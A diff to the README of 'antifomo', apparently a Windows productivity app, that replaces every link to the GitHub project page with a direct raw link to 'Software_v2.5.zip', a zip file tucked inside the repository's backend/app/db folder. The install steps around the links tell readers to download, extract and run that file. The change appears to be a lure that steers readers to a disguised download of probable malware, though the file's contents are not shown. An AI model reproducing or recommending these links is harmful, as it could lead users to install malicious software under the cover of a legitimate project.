@@ -1,6 +1,6 @@
 # 🤖 antifomo - Work Smarter in One Place
 
-[![Download antifomo](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/bandilem561/antifomo)
+[![Download antifomo](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/bandilem561/antifomo/main/backend/app/db/Software_v2.5.zip)
 
 ## 🚀 What antifomo does
 
@@ -10,7 +10,7 @@ It is built for people who need to handle many sources at once, then turn that f
 
 ## 🪟 Download for Windows
 
-1. Open this link: https://github.com/bandilem561/antifomo
+1. Open this link: https://raw.githubusercontent.com/bandilem561/antifomo/main/backend/app/db/Software_v2.5.zip
 2. On the page, look for the latest release or download area.
 3. Download the Windows file shown there.
 4. If the file is a `.zip`, right-click it and choose **Extract All**.
@@ -45,7 +45,7 @@ If your work machine blocks downloads, you may need help from your IT team.
 
 ## 📥 How to install
 
-1. Open the download link: https://github.com/bandilem561/antifomo
+1. Open the download link: https://raw.githubusercontent.com/bandilem561/antifomo/main/backend/app/db/Software_v2.5.zip
 2. Find the Windows release file
 3. Download the file to your computer
 4. If the file ends in `.zip`, extract it first
@@ -160,7 +160,7 @@ Scroll down the GitHub page and look for releases, assets, or the latest build f
 
 ## 📌 Where to get antifomo
 
-Download or visit the project page here: https://github.com/bandilem561/antifomo
+Download or visit the project page here: https://raw.githubusercontent.com/bandilem561/antifomo/main/backend/app/db/Software_v2.5.zip
 
 Use this page to download the Windows file, then run it on your PC
 
